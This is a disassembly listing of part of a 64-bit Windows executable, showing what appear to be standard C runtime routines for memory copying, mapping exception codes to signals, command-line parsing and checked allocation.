   140004f6a:	f3 42 0f 7f 4c 09 b0 	movdqu %xmm1,-0x50(%rcx,%r9,1)
   140004f71:	f3 42 0f 6f 4c 0a c0 	movdqu -0x40(%rdx,%r9,1),%xmm1
   140004f78:	f3 42 0f 7f 4c 09 c0 	movdqu %xmm1,-0x40(%rcx,%r9,1)
   140004f7f:	f3 42 0f 6f 4c 0a d0 	movdqu -0x30(%rdx,%r9,1),%xmm1
   140004f86:	f3 42 0f 7f 4c 09 d0 	movdqu %xmm1,-0x30(%rcx,%r9,1)
   140004f8d:	f3 42 0f 6f 4c 0a e0 	movdqu -0x20(%rdx,%r9,1),%xmm1
   140004f94:	f3 42 0f 7f 4c 09 e0 	movdqu %xmm1,-0x20(%rcx,%r9,1)
   140004f9b:	f3 42 0f 7f 6c 01 f0 	movdqu %xmm5,-0x10(%rcx,%r8,1)
   140004fa2:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   140004fa6:	c3                   	ret
   140004fa7:	cc                   	int3
   140004fa8:	cc                   	int3
   140004fa9:	cc                   	int3
   140004faa:	cc                   	int3
   140004fab:	cc                   	int3
   140004fac:	cc                   	int3
   140004fad:	cc                   	int3
   140004fae:	cc                   	int3
   140004faf:	cc                   	int3
   140004fb0:	cc                   	int3
   140004fb1:	cc                   	int3
   140004fb2:	cc                   	int3
   140004fb3:	cc                   	int3
   140004fb4:	cc                   	int3
   140004fb5:	cc                   	int3
   140004fb6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004fbd:	00 00 00 
   140004fc0:	57                   	push   %rdi
   140004fc1:	56                   	push   %rsi
   140004fc2:	48 8b f9             	mov    %rcx,%rdi
   140004fc5:	48 8b f2             	mov    %rdx,%rsi
   140004fc8:	49 8b c8             	mov    %r8,%rcx
   140004fcb:	f3 a4                	rep movsb (%rsi),(%rdi)
   140004fcd:	5e                   	pop    %rsi
   140004fce:	5f                   	pop    %rdi
   140004fcf:	c3                   	ret
   140004fd0:	cc                   	int3
   140004fd1:	cc                   	int3
   140004fd2:	cc                   	int3
   140004fd3:	cc                   	int3
   140004fd4:	cc                   	int3
   140004fd5:	cc                   	int3
   140004fd6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004fdd:	00 00 00 
   140004fe0:	0f 10 12             	movups (%rdx),%xmm2
   140004fe3:	48 2b d1             	sub    %rcx,%rdx
   140004fe6:	49 03 c8             	add    %r8,%rcx
   140004fe9:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   140004fee:	48 83 e9 10          	sub    $0x10,%rcx
   140004ff2:	49 83 e8 10          	sub    $0x10,%r8
   140004ff6:	f6 c1 0f             	test   $0xf,%cl
   140004ff9:	74 18                	je     0x140005013
   140004ffb:	4c 8b c9             	mov    %rcx,%r9
   140004ffe:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   140005002:	0f 10 c8             	movups %xmm0,%xmm1
   140005005:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   140005009:	41 0f 11 09          	movups %xmm1,(%r9)
   14000500d:	4c 8b c1             	mov    %rcx,%r8
   140005010:	4c 2b c0             	sub    %rax,%r8
   140005013:	4d 8b c8             	mov    %r8,%r9
   140005016:	49 c1 e9 07          	shr    $0x7,%r9
   14000501a:	74 71                	je     0x14000508d
   14000501c:	0f 29 01             	movaps %xmm0,(%rcx)
   14000501f:	eb 16                	jmp    0x140005037
   140005021:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140005028:	0f 1f 84 00 00 00 00 
   14000502f:	00 
   140005030:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140005034:	0f 29 09             	movaps %xmm1,(%rcx)
   140005037:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   14000503c:	0f 10 4c 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm1
   140005041:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   140005048:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   14000504c:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   140005050:	0f 10 44 11 50       	movups 0x50(%rcx,%rdx,1),%xmm0
   140005055:	0f 10 4c 11 40       	movups 0x40(%rcx,%rdx,1),%xmm1
   14000505a:	49 ff c9             	dec    %r9
   14000505d:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   140005061:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   140005065:	0f 10 44 11 30       	movups 0x30(%rcx,%rdx,1),%xmm0
   14000506a:	0f 10 4c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm1
   14000506f:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   140005073:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   140005077:	0f 10 44 11 10       	movups 0x10(%rcx,%rdx,1),%xmm0
   14000507c:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   140005080:	75 ae                	jne    0x140005030
   140005082:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140005086:	49 83 e0 7f          	and    $0x7f,%r8
   14000508a:	0f 28 c1             	movaps %xmm1,%xmm0
   14000508d:	4d 8b c8             	mov    %r8,%r9
   140005090:	49 c1 e9 04          	shr    $0x4,%r9
   140005094:	74 1a                	je     0x1400050b0
   140005096:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000509d:	00 00 00 
   1400050a0:	0f 11 01             	movups %xmm0,(%rcx)
   1400050a3:	48 83 e9 10          	sub    $0x10,%rcx
   1400050a7:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   1400050ab:	49 ff c9             	dec    %r9
   1400050ae:	75 f0                	jne    0x1400050a0
   1400050b0:	49 83 e0 0f          	and    $0xf,%r8
   1400050b4:	74 03                	je     0x1400050b9
   1400050b6:	0f 11 10             	movups %xmm2,(%rax)
   1400050b9:	0f 11 01             	movups %xmm0,(%rcx)
   1400050bc:	c3                   	ret
   1400050bd:	cc                   	int3
   1400050be:	cc                   	int3
   1400050bf:	cc                   	int3
   1400050c0:	cc                   	int3
   1400050c1:	cc                   	int3
   1400050c2:	cc                   	int3
   1400050c3:	cc                   	int3
   1400050c4:	cc                   	int3
   1400050c5:	cc                   	int3
   1400050c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400050cd:	00 00 00 
   1400050d0:	57                   	push   %rdi
   1400050d1:	56                   	push   %rsi
   1400050d2:	48 8b f9             	mov    %rcx,%rdi
   1400050d5:	48 8b f2             	mov    %rdx,%rsi
   1400050d8:	49 8b c8             	mov    %r8,%rcx
   1400050db:	f3 a4                	rep movsb (%rsi),(%rdi)
   1400050dd:	5e                   	pop    %rsi
   1400050de:	5f                   	pop    %rdi
   1400050df:	c3                   	ret
   1400050e0:	cc                   	int3
   1400050e1:	cc                   	int3
   1400050e2:	cc                   	int3
   1400050e3:	cc                   	int3
   1400050e4:	cc                   	int3
   1400050e5:	cc                   	int3
   1400050e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400050ed:	00 00 00 
   1400050f0:	0f 10 12             	movups (%rdx),%xmm2
   1400050f3:	48 2b d1             	sub    %rcx,%rdx
   1400050f6:	49 03 c8             	add    %r8,%rcx
   1400050f9:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   1400050fe:	48 83 e9 10          	sub    $0x10,%rcx
   140005102:	49 83 e8 10          	sub    $0x10,%r8
   140005106:	f6 c1 0f             	test   $0xf,%cl
   140005109:	74 18                	je     0x140005123
   14000510b:	4c 8b c9             	mov    %rcx,%r9
   14000510e:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   140005112:	0f 10 c8             	movups %xmm0,%xmm1
   140005115:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   140005119:	41 0f 11 09          	movups %xmm1,(%r9)
   14000511d:	4c 8b c1             	mov    %rcx,%r8
   140005120:	4c 2b c0             	sub    %rax,%r8
   140005123:	4d 8b c8             	mov    %r8,%r9
   140005126:	49 c1 e9 07          	shr    $0x7,%r9
   14000512a:	74 71                	je     0x14000519d
   14000512c:	0f 29 01             	movaps %xmm0,(%rcx)
   14000512f:	eb 16                	jmp    0x140005147
   140005131:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140005138:	0f 1f 84 00 00 00 00 
   14000513f:	00 
   140005140:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140005144:	0f 29 09             	movaps %xmm1,(%rcx)
   140005147:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   14000514c:	0f 10 4c 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm1
   140005151:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   140005158:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   14000515c:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   140005160:	0f 10 44 11 50       	movups 0x50(%rcx,%rdx,1),%xmm0
   140005165:	0f 10 4c 11 40       	movups 0x40(%rcx,%rdx,1),%xmm1
   14000516a:	49 ff c9             	dec    %r9
   14000516d:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   140005171:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   140005175:	0f 10 44 11 30       	movups 0x30(%rcx,%rdx,1),%xmm0
   14000517a:	0f 10 4c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm1
   14000517f:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   140005183:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   140005187:	0f 10 44 11 10       	movups 0x10(%rcx,%rdx,1),%xmm0
   14000518c:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   140005190:	75 ae                	jne    0x140005140
   140005192:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140005196:	49 83 e0 7f          	and    $0x7f,%r8
   14000519a:	0f 28 c1             	movaps %xmm1,%xmm0
   14000519d:	4d 8b c8             	mov    %r8,%r9
   1400051a0:	49 c1 e9 04          	shr    $0x4,%r9
   1400051a4:	74 1a                	je     0x1400051c0
   1400051a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400051ad:	00 00 00 
   1400051b0:	0f 11 01             	movups %xmm0,(%rcx)
   1400051b3:	48 83 e9 10          	sub    $0x10,%rcx
   1400051b7:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   1400051bb:	49 ff c9             	dec    %r9
   1400051be:	75 f0                	jne    0x1400051b0
   1400051c0:	49 83 e0 0f          	and    $0xf,%r8
   1400051c4:	74 03                	je     0x1400051c9
   1400051c6:	0f 11 10             	movups %xmm2,(%rax)
   1400051c9:	0f 11 01             	movups %xmm0,(%rcx)
   1400051cc:	c3                   	ret
   1400051cd:	cc                   	int3
   1400051ce:	cc                   	int3
   1400051cf:	cc                   	int3
   1400051d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400051d5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400051da:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400051df:	57                   	push   %rdi
   1400051e0:	48 83 ec 20          	sub    $0x20,%rsp
   1400051e4:	48 8b f2             	mov    %rdx,%rsi
   1400051e7:	8b f9                	mov    %ecx,%edi
   1400051e9:	e8 9e 1a 00 00       	call   0x140006c8c
   1400051ee:	45 33 c9             	xor    %r9d,%r9d
   1400051f1:	48 8b d8             	mov    %rax,%rbx
   1400051f4:	48 85 c0             	test   %rax,%rax
   1400051f7:	74 1f                	je     0x140005218
   1400051f9:	48 8b 08             	mov    (%rax),%rcx
   1400051fc:	48 8b c1             	mov    %rcx,%rax
   1400051ff:	4c 8d 81 c0 00 00 00 	lea    0xc0(%rcx),%r8
   140005206:	49 3b c8             	cmp    %r8,%rcx
   140005209:	74 0d                	je     0x140005218
   14000520b:	39 38                	cmp    %edi,(%rax)
   14000520d:	74 20                	je     0x14000522f
   14000520f:	48 83 c0 10          	add    $0x10,%rax
   140005213:	49 3b c0             	cmp    %r8,%rax
   140005216:	75 f3                	jne    0x14000520b
   140005218:	33 c0                	xor    %eax,%eax
   14000521a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000521f:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005224:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005229:	48 83 c4 20          	add    $0x20,%rsp
   14000522d:	5f                   	pop    %rdi
   14000522e:	c3                   	ret
   14000522f:	48 85 c0             	test   %rax,%rax
   140005232:	74 e4                	je     0x140005218
   140005234:	4c 8b 40 08          	mov    0x8(%rax),%r8
   140005238:	4d 85 c0             	test   %r8,%r8
   14000523b:	74 db                	je     0x140005218
   14000523d:	49 83 f8 05          	cmp    $0x5,%r8
   140005241:	75 0a                	jne    0x14000524d
   140005243:	4c 89 48 08          	mov    %r9,0x8(%rax)
   140005247:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   14000524b:	eb cd                	jmp    0x14000521a
   14000524d:	49 83 f8 01          	cmp    $0x1,%r8
   140005251:	75 05                	jne    0x140005258
   140005253:	83 c8 ff             	or     $0xffffffff,%eax
   140005256:	eb c2                	jmp    0x14000521a
   140005258:	48 8b 6b 08          	mov    0x8(%rbx),%rbp
   14000525c:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   140005260:	83 78 04 08          	cmpl   $0x8,0x4(%rax)
   140005264:	0f 85 c4 00 00 00    	jne    0x14000532e
   14000526a:	48 83 c1 30          	add    $0x30,%rcx
   14000526e:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
   140005275:	eb 08                	jmp    0x14000527f
   140005277:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   14000527b:	48 83 c1 10          	add    $0x10,%rcx
   14000527f:	48 3b ca             	cmp    %rdx,%rcx
   140005282:	75 f3                	jne    0x140005277
   140005284:	81 38 8d 00 00 c0    	cmpl   $0xc000008d,(%rax)
   14000528a:	8b 7b 10             	mov    0x10(%rbx),%edi
   14000528d:	74 7a                	je     0x140005309
   14000528f:	81 38 8e 00 00 c0    	cmpl   $0xc000008e,(%rax)
   140005295:	74 6b                	je     0x140005302
   140005297:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%rax)
   14000529d:	74 5c                	je     0x1400052fb
   14000529f:	81 38 90 00 00 c0    	cmpl   $0xc0000090,(%rax)
   1400052a5:	74 4d                	je     0x1400052f4
   1400052a7:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%rax)
   1400052ad:	74 3e                	je     0x1400052ed
   1400052af:	81 38 92 00 00 c0    	cmpl   $0xc0000092,(%rax)
   1400052b5:	74 2f                	je     0x1400052e6
   1400052b7:	81 38 93 00 00 c0    	cmpl   $0xc0000093,(%rax)
   1400052bd:	74 20                	je     0x1400052df
   1400052bf:	81 38 b4 02 00 c0    	cmpl   $0xc00002b4,(%rax)
   1400052c5:	74 11                	je     0x1400052d8
   1400052c7:	81 38 b5 02 00 c0    	cmpl   $0xc00002b5,(%rax)
   1400052cd:	8b d7                	mov    %edi,%edx
   1400052cf:	75 40                	jne    0x140005311
   1400052d1:	ba 8d 00 00 00       	mov    $0x8d,%edx
   1400052d6:	eb 36                	jmp    0x14000530e
   1400052d8:	ba 8e 00 00 00       	mov    $0x8e,%edx
   1400052dd:	eb 2f                	jmp    0x14000530e
   1400052df:	ba 85 00 00 00       	mov    $0x85,%edx
   1400052e4:	eb 28                	jmp    0x14000530e
   1400052e6:	ba 8a 00 00 00       	mov    $0x8a,%edx
   1400052eb:	eb 21                	jmp    0x14000530e
   1400052ed:	ba 84 00 00 00       	mov    $0x84,%edx
   1400052f2:	eb 1a                	jmp    0x14000530e
   1400052f4:	ba 81 00 00 00       	mov    $0x81,%edx
   1400052f9:	eb 13                	jmp    0x14000530e
   1400052fb:	ba 86 00 00 00       	mov    $0x86,%edx
   140005300:	eb 0c                	jmp    0x14000530e
   140005302:	ba 83 00 00 00       	mov    $0x83,%edx
   140005307:	eb 05                	jmp    0x14000530e
   140005309:	ba 82 00 00 00       	mov    $0x82,%edx
   14000530e:	89 53 10             	mov    %edx,0x10(%rbx)
   140005311:	49 ba 70 33 d3 30 4f 	movabs $0x8b9c1f4f30d33370,%r10
   140005318:	1f 9c 8b 
   14000531b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140005320:	49 8b c0             	mov    %r8,%rax
   140005323:	ff 15 3f 9f 00 00    	call   *0x9f3f(%rip)        # 0x14000f268
   140005329:	89 7b 10             	mov    %edi,0x10(%rbx)
   14000532c:	eb 1a                	jmp    0x140005348
   14000532e:	4c 89 48 08          	mov    %r9,0x8(%rax)
   140005332:	49 ba 70 73 d7 50 49 	movabs $0xc6c1864950d77370,%r10
   140005339:	86 c1 c6 
   14000533c:	8b 48 04             	mov    0x4(%rax),%ecx
   14000533f:	49 8b c0             	mov    %r8,%rax
   140005342:	ff 15 20 9f 00 00    	call   *0x9f20(%rip)        # 0x14000f268
   140005348:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   14000534c:	e9 02 ff ff ff       	jmp    0x140005253
   140005351:	cc                   	int3
   140005352:	cc                   	int3
   140005353:	cc                   	int3
   140005354:	8b 05 56 49 01 00    	mov    0x14956(%rip),%eax        # 0x140019cb0
   14000535a:	c3                   	ret
   14000535b:	cc                   	int3
   14000535c:	89 0d 4e 49 01 00    	mov    %ecx,0x1494e(%rip)        # 0x140019cb0
   140005362:	c3                   	ret
   140005363:	cc                   	int3
   140005364:	48 8b 15 d5 3c 01 00 	mov    0x13cd5(%rip),%rdx        # 0x140019040
   14000536b:	8b ca                	mov    %edx,%ecx
   14000536d:	48 33 15 44 49 01 00 	xor    0x14944(%rip),%rdx        # 0x140019cb8
   140005374:	83 e1 3f             	and    $0x3f,%ecx
   140005377:	48 d3 ca             	ror    %cl,%rdx
   14000537a:	48 85 d2             	test   %rdx,%rdx
   14000537d:	0f 95 c0             	setne  %al
   140005380:	c3                   	ret
   140005381:	cc                   	int3
   140005382:	cc                   	int3
   140005383:	cc                   	int3
   140005384:	48 89 0d 2d 49 01 00 	mov    %rcx,0x1492d(%rip)        # 0x140019cb8
   14000538b:	c3                   	ret
   14000538c:	48 8b 15 ad 3c 01 00 	mov    0x13cad(%rip),%rdx        # 0x140019040
   140005393:	4c 8b c1             	mov    %rcx,%r8
   140005396:	8b ca                	mov    %edx,%ecx
   140005398:	48 33 15 19 49 01 00 	xor    0x14919(%rip),%rdx        # 0x140019cb8
   14000539f:	83 e1 3f             	and    $0x3f,%ecx
   1400053a2:	48 d3 ca             	ror    %cl,%rdx
   1400053a5:	48 85 d2             	test   %rdx,%rdx
   1400053a8:	75 03                	jne    0x1400053ad
   1400053aa:	33 c0                	xor    %eax,%eax
   1400053ac:	c3                   	ret
   1400053ad:	49 ba 70 71 54 58 e6 	movabs $0xd88807e658547170,%r10
   1400053b4:	07 88 d8 
   1400053b7:	49 8b c8             	mov    %r8,%rcx
   1400053ba:	48 8b c2             	mov    %rdx,%rax
   1400053bd:	48 ff 25 a4 9e 00 00 	rex.W jmp *0x9ea4(%rip)        # 0x14000f268
   1400053c4:	4c 8b 05 75 3c 01 00 	mov    0x13c75(%rip),%r8        # 0x140019040
   1400053cb:	4c 8b c9             	mov    %rcx,%r9
   1400053ce:	41 8b d0             	mov    %r8d,%edx
   1400053d1:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400053d6:	83 e2 3f             	and    $0x3f,%edx
   1400053d9:	2b ca                	sub    %edx,%ecx
   1400053db:	49 d3 c9             	ror    %cl,%r9
   1400053de:	4d 33 c8             	xor    %r8,%r9
   1400053e1:	4c 89 0d d0 48 01 00 	mov    %r9,0x148d0(%rip)        # 0x140019cb8
   1400053e8:	c3                   	ret
   1400053e9:	cc                   	int3
   1400053ea:	cc                   	int3
   1400053eb:	cc                   	int3
   1400053ec:	48 8b c4             	mov    %rsp,%rax
   1400053ef:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400053f3:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400053f7:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400053fb:	4c 89 70 20          	mov    %r14,0x20(%rax)
   1400053ff:	41 57                	push   %r15
   140005401:	4c 8b 5c 24 30       	mov    0x30(%rsp),%r11
   140005406:	33 f6                	xor    %esi,%esi
   140005408:	49 8b d9             	mov    %r9,%rbx
   14000540b:	49 89 33             	mov    %rsi,(%r11)
   14000540e:	49 c7 01 01 00 00 00 	movq   $0x1,(%r9)
   140005415:	48 85 d2             	test   %rdx,%rdx
   140005418:	74 07                	je     0x140005421
   14000541a:	4c 89 02             	mov    %r8,(%rdx)
   14000541d:	48 83 c2 08          	add    $0x8,%rdx
   140005421:	44 8a ce             	mov    %sil,%r9b
   140005424:	41 bf 22 00 00 00    	mov    $0x22,%r15d
   14000542a:	4c 8b d1             	mov    %rcx,%r10
   14000542d:	66 44 39 39          	cmp    %r15w,(%rcx)
   140005431:	75 11                	jne    0x140005444
   140005433:	45 84 c9             	test   %r9b,%r9b
   140005436:	41 0f b7 c7          	movzwl %r15w,%eax
   14000543a:	41 0f 94 c1          	sete   %r9b
   14000543e:	48 83 c1 02          	add    $0x2,%rcx
   140005442:	eb 1f                	jmp    0x140005463
   140005444:	49 ff 03             	incq   (%r11)
   140005447:	4d 85 c0             	test   %r8,%r8
   14000544a:	74 0b                	je     0x140005457
   14000544c:	0f b7 01             	movzwl (%rcx),%eax
   14000544f:	66 41 89 00          	mov    %ax,(%r8)
   140005453:	49 83 c0 02          	add    $0x2,%r8
   140005457:	0f b7 01             	movzwl (%rcx),%eax
   14000545a:	48 83 c1 02          	add    $0x2,%rcx
   14000545e:	66 85 c0             	test   %ax,%ax
   140005461:	74 1d                	je     0x140005480
   140005463:	45 84 c9             	test   %r9b,%r9b
   140005466:	75 c2                	jne    0x14000542a
   140005468:	66 83 f8 20          	cmp    $0x20,%ax
   14000546c:	74 06                	je     0x140005474
   14000546e:	66 83 f8 09          	cmp    $0x9,%ax
   140005472:	75 b6                	jne    0x14000542a
   140005474:	4d 85 c0             	test   %r8,%r8
   140005477:	74 0a                	je     0x140005483
   140005479:	66 41 89 70 fe       	mov    %si,-0x2(%r8)
   14000547e:	eb 03                	jmp    0x140005483
   140005480:	49 8b ca             	mov    %r10,%rcx
   140005483:	40 8a fe             	mov    %sil,%dil
   140005486:	41 be 5c 00 00 00    	mov    $0x5c,%r14d
   14000548c:	0f b7 01             	movzwl (%rcx),%eax
   14000548f:	66 85 c0             	test   %ax,%ax
   140005492:	0f 84 d4 00 00 00    	je     0x14000556c
   140005498:	66 83 f8 20          	cmp    $0x20,%ax
   14000549c:	74 06                	je     0x1400054a4
   14000549e:	66 83 f8 09          	cmp    $0x9,%ax
   1400054a2:	75 09                	jne    0x1400054ad
   1400054a4:	48 83 c1 02          	add    $0x2,%rcx
   1400054a8:	0f b7 01             	movzwl (%rcx),%eax
   1400054ab:	eb eb                	jmp    0x140005498
   1400054ad:	66 85 c0             	test   %ax,%ax
   1400054b0:	0f 84 b6 00 00 00    	je     0x14000556c
   1400054b6:	48 85 d2             	test   %rdx,%rdx
   1400054b9:	74 07                	je     0x1400054c2
   1400054bb:	4c 89 02             	mov    %r8,(%rdx)
   1400054be:	48 83 c2 08          	add    $0x8,%rdx
   1400054c2:	48 ff 03             	incq   (%rbx)
   1400054c5:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   1400054cb:	8b c6                	mov    %esi,%eax
   1400054cd:	eb 06                	jmp    0x1400054d5
   1400054cf:	48 83 c1 02          	add    $0x2,%rcx
   1400054d3:	ff c0                	inc    %eax
   1400054d5:	44 0f b7 09          	movzwl (%rcx),%r9d
   1400054d9:	66 45 3b ce          	cmp    %r14w,%r9w
   1400054dd:	74 f0                	je     0x1400054cf
   1400054df:	66 45 3b cf          	cmp    %r15w,%r9w
   1400054e3:	75 37                	jne    0x14000551c
   1400054e5:	41 84 c2             	test   %al,%r10b
   1400054e8:	75 1c                	jne    0x140005506
   1400054ea:	40 84 ff             	test   %dil,%dil
   1400054ed:	74 0d                	je     0x1400054fc
   1400054ef:	66 44 39 79 02       	cmp    %r15w,0x2(%rcx)
   1400054f4:	75 06                	jne    0x1400054fc
   1400054f6:	48 83 c1 02          	add    $0x2,%rcx
   1400054fa:	eb 0a                	jmp    0x140005506
   1400054fc:	40 84 ff             	test   %dil,%dil
   1400054ff:	44 8b d6             	mov    %esi,%r10d
   140005502:	40 0f 94 c7          	sete   %dil
   140005506:	d1 e8                	shr    $1,%eax
   140005508:	eb 12                	jmp    0x14000551c
   14000550a:	ff c8                	dec    %eax
   14000550c:	4d 85 c0             	test   %r8,%r8
   14000550f:	74 08                	je     0x140005519
   140005511:	66 45 89 30          	mov    %r14w,(%r8)
   140005515:	49 83 c0 02          	add    $0x2,%r8
   140005519:	49 ff 03             	incq   (%r11)
   14000551c:	85 c0                	test   %eax,%eax
   14000551e:	75 ea                	jne    0x14000550a
   140005520:	0f b7 01             	movzwl (%rcx),%eax
   140005523:	66 85 c0             	test   %ax,%ax
   140005526:	74 2f                	je     0x140005557
   140005528:	40 84 ff             	test   %dil,%dil
   14000552b:	75 0c                	jne    0x140005539
   14000552d:	66 83 f8 20          	cmp    $0x20,%ax
   140005531:	74 24                	je     0x140005557
   140005533:	66 83 f8 09          	cmp    $0x9,%ax
   140005537:	74 1e                	je     0x140005557
   140005539:	45 85 d2             	test   %r10d,%r10d
   14000553c:	74 10                	je     0x14000554e
   14000553e:	4d 85 c0             	test   %r8,%r8
   140005541:	74 08                	je     0x14000554b
   140005543:	66 41 89 00          	mov    %ax,(%r8)
   140005547:	49 83 c0 02          	add    $0x2,%r8
   14000554b:	49 ff 03             	incq   (%r11)
   14000554e:	48 83 c1 02          	add    $0x2,%rcx
   140005552:	e9 6e ff ff ff       	jmp    0x1400054c5
   140005557:	4d 85 c0             	test   %r8,%r8
   14000555a:	74 08                	je     0x140005564
   14000555c:	66 41 89 30          	mov    %si,(%r8)
   140005560:	49 83 c0 02          	add    $0x2,%r8
   140005564:	49 ff 03             	incq   (%r11)
   140005567:	e9 20 ff ff ff       	jmp    0x14000548c
   14000556c:	48 85 d2             	test   %rdx,%rdx
   14000556f:	74 03                	je     0x140005574
   140005571:	48 89 32             	mov    %rsi,(%rdx)
   140005574:	48 ff 03             	incq   (%rbx)
   140005577:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000557c:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   140005581:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140005586:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   14000558b:	41 5f                	pop    %r15
   14000558d:	c3                   	ret
   14000558e:	cc                   	int3
   14000558f:	cc                   	int3
   140005590:	40 53                	rex push %rbx
   140005592:	48 83 ec 20          	sub    $0x20,%rsp
   140005596:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   14000559d:	ff ff 1f 
   1400055a0:	4c 8b ca             	mov    %rdx,%r9
   1400055a3:	48 3b c8             	cmp    %rax,%rcx
   1400055a6:	73 3d                	jae    0x1400055e5
   1400055a8:	33 d2                	xor    %edx,%edx
   1400055aa:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400055ae:	49 f7 f0             	div    %r8
   1400055b1:	4c 3b c8             	cmp    %rax,%r9
   1400055b4:	73 2f                	jae    0x1400055e5
   1400055b6:	48 c1 e1 03          	shl    $0x3,%rcx
   1400055ba:	4d 0f af c8          	imul   %r8,%r9
   1400055be:	48 8b c1             	mov    %rcx,%rax
   1400055c1:	48 f7 d0             	not    %rax
   1400055c4:	49 3b c1             	cmp    %r9,%rax
   1400055c7:	76 1c                	jbe    0x1400055e5
   1400055c9:	49 03 c9             	add    %r9,%rcx
   1400055cc:	ba 01 00 00 00       	mov    $0x1,%edx
   1400055d1:	e8 9e 1e 00 00       	call   0x140007474
   1400055d6:	33 c9                	xor    %ecx,%ecx
   1400055d8:	48 8b d8             	mov    %rax,%rbx
   1400055db:	e8 0c 1f 00 00       	call   0x1400074ec
   1400055e0:	48 8b c3             	mov    %rbx,%rax
   1400055e3:	eb 02                	jmp    0x1400055e7
   1400055e5:	33 c0                	xor    %eax,%eax
   1400055e7:	48 83 c4 20          	add    $0x20,%rsp
   1400055eb:	5b                   	pop    %rbx
   1400055ec:	c3                   	ret
   1400055ed:	cc                   	int3
   1400055ee:	cc                   	int3
   1400055ef:	cc                   	int3
   1400055f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400055f5:	55                   	push   %rbp
   1400055f6:	56                   	push   %rsi
   1400055f7:	57                   	push   %rdi
   1400055f8:	41 56                	push   %r14
   1400055fa:	41 57                	push   %r15
   1400055fc:	48 8b ec             	mov    %rsp,%rbp
   1400055ff:	48 83 ec 30          	sub    $0x30,%rsp
   140005603:	33 ff                	xor    %edi,%edi
   140005605:	44 8b f1             	mov    %ecx,%r14d
   140005608:	85 c9                	test   %ecx,%ecx
   14000560a:	0f 84 4f 01 00 00    	je     0x14000575f
   140005610:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140005613:	83 f8 01             	cmp    $0x1,%eax
   140005616:	76 16                	jbe    0x14000562e
   140005618:	e8 37 1e 00 00       	call   0x140007454
   14000561d:	8d 5f 16             	lea    0x16(%rdi),%ebx
   140005620:	89 18                	mov    %ebx,(%rax)
   140005622:	e8 d5 1b 00 00       	call   0x1400071fc
   140005627:	8b fb                	mov    %ebx,%edi
   140005629:	e9 31 01 00 00       	jmp    0x14000575f
